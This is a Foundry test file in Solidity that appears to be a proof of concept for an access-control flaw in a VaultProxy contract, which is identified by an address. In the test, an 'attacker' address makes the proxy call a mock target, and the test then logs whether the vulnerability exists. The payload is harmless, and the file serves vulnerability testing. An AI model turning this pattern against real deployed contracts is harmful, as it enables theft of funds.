// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol";

contract MockTarget {
    bool public called;

    function execute() external {
        called = true;
    }
}

contract VaultProxyTest is Test {
    VaultProxy vault;
    MockTarget target;
    address deployer = address(this);
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy VaultProxy (emulating EOA deployment)
        hoax(deployer, 1 ether);
        vault = new VaultProxy{value: 1 ether}();
        
        // Deploy mock target contract
        target = new MockTarget();
    }

    function testProxyVulnerability() public {
        console2.log("--- BEFORE-Trigger Called State ---");
        bool beforeCalled = target.called();
        console2.log("Before called state: %s", beforeCalled ? "true" : "false");

        console2.log("--- Trigger Proxy Call ---");
        // Simulate malicious interaction via intermediary contract
        bytes memory data = abi.encodeWithSignature("execute()");
        
        // Attacker calls proxy through intermediary contract
        vm.startPrank(attacker);
        vault.proxy(address(target), data);
        vm.stopPrank();

        console2.log("--- AFTER-Trigger Called State ---");
        bool afterCalled = target.called();
        console2.log("After called state: %s", afterCalled ? "true" : "false");
        
        // Determine vulnerability existence
        bool stateChanged = (!beforeCalled && afterCalled);
        console2.log("State changed: %s", stateChanged ? "Yes" : "No");
        console2.log("Vulnerability exists: %s", stateChanged ? "Yes" : "No");
        
        // Final verdict
        if (stateChanged) {
            console2.log("Vulnerability Exists: Attacker successfully changed contract state through proxy");
        } else {
            console2.log("Vulnerability not Exist: Proxy call did not modify target contract state");
        }
    }
}